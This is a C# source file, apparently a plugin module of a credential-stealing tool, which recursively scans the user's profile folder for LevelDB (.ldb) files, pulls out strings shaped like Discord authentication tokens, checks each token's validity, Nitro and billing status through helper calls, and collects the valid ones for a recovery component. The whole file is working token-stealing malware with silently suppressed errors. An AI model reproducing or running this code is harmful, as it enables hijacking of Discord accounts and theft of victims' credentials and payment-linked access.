using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace Plugin
{
    class Discordo
    {
        public static string localpath = System.Environment.GetEnvironmentVariable("USERPROFILE");

        public static List<string> ldbfiles = new List<string>();
        public static List<string> tokensSent = new List<string>();

        static string rawText;

        public static void GetTokens()
        {
            searchAll(localpath);
            if (ldbfiles.Count == 0)
            {
                return;
            }
            foreach (string filez in ldbfiles)
            {

                if (filez.EndsWith(".ldb"))
                {
                    try
                    {
                        rawText = File.ReadAllText(filez);
                        if (rawText.Contains("oken"))
                        {

                            foreach (Match match in Regex.Matches(rawText, "[^\"]*"))
                            {

                                if ((match.Length == 59 || match.Length == 89 || match.Length == 88) && isValidString(match.ToString()) == true)
                                {
                                    if (tokensSent.Contains(match.ToString()) == false)
                                    {
                                        tokensSent.Add(match.ToString() + " -> " + Net.TokenState(match.ToString()) + " -> " + Net.NitroState(match.ToString()) + " -> " + Net.BillingState(match.ToString()));
                                    }
                                }
                            }
                        }
                    }
                    catch { }
                }

            }
            try { WriteTokens(); } catch { }
        }

        public static void WriteTokens()
        {
            string tokens = "";
            foreach (string token in tokensSent)
            {
                if (!token.Contains("Valid: NO"))
                    tokens += token + "\n";
            }

            Recorvery.totaltokens = tokens;
        }

        static bool isValidString(string text)
        {
            string allowed = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_";
            string upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            bool hasUpper = false;
            foreach (char ch in text)
            {
                if (upper.Contains(ch.ToString()) == true)
                {
                    hasUpper = true;
                    break;
                }
            }
            if (hasUpper == false)
                return false;
            foreach (char ch in text)
            {
                if (allowed.Contains(ch.ToString()) == false)
                    return false;
            }
            return true;
        }

        public static void searchAll(string location)
        {
            try
            {
                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    ldbfiles.Add(files[i]);
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    searchAll(childDirectories[i]);
                }
            }
            catch (Exception)
            {

            }
        }
    }
}
